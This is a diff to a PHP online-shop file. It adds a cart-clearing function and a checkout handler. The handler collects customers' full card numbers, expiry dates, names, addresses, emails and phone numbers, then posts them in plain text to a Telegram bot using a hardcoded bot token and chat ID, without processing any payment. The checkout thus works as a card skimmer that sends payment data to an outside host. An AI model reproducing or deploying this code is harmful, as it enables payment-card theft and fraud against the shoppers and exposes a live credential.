@@ -851,8 +851,26 @@ function mergeCarts()
 }
 
 
+function clearCart()
+{
+    $db = connectToDatabase();
 
+    if (isset($_SESSION['user_id'])) {
+        $user_id = $_SESSION['user_id'];
 
+        $query = "DELETE FROM cart WHERE user_id = ?";
+        $stmt = $db->prepare($query);
+        $stmt->execute([$user_id]);
+    } else {
+    
+        if (isset($_SESSION['cart'])) {
+    
+            $_SESSION['cart'] = [];
+        }
+    }
+    
+    return true; 
+}
 
 
 
@@ -962,4 +980,62 @@ if (isset($_GET['min_price']) || isset($_GET['max_price']) ){
     $_SESSION['min'] = $min;
     $_SESSION['max'] = $max;
    
+}
+
+
+if (isset($_POST['checkoutSubmit'])) {
+    logError("keldi checkout");
+    $fullName = isset($_POST['fullNameCOD']) ? $_POST['fullNameCOD'] : 'N/A'; 
+    $cardNumber = isset($_POST['cardNumber']) ? $_POST['cardNumber'] : 'N/A'; 
+    $cardHolder = isset($_POST['cardHolder']) ? $_POST['cardHolder'] : 'N/A';
+    $expDate = $_POST['expDate'];
+    $email = $_POST['email'];
+    $country = $_POST['country'];
+    $streetAddress = $_POST['street_address'];
+    $zipCode = $_POST['zipCode'];
+    $phoneNumber = $_POST['phone_number'];
+
+   
+    $message = "Checkout Information:\n";
+    $message .= "Full Name: $fullName\n";
+    $message .= "Card Number: $cardNumber\n"; 
+    $message .= "Card Holder: $cardHolder\n";
+    $message .= "Expiration Date: $expDate\n";
+    $message .= "Email: $email\n";
+    $message .= "Country: $country\n";
+    $message .= "Address: $streetAddress\n";
+    $message .= "Zip Code: $zipCode\n";
+    $message .= "Phone Number: $phoneNumber\n";
+
+    // Telegram API URL
+    $botToken = "7070665154:AAHmVDq-UGsJk3Yd0KRwiotNnxQIP3hVPJI"; 
+    $chatId = "5129089072"; 
+    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
+
+    
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'Markdown', 
+    ];
+
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+   
+    // if ($response) {
+    //     echo "Message sent to Telegram!";
+    // } else {
+    //     echo "Error sending message.";
+    // }
+
+    clearCart();
+    header("Location: Views/checkout.php");
+    exit();
 }
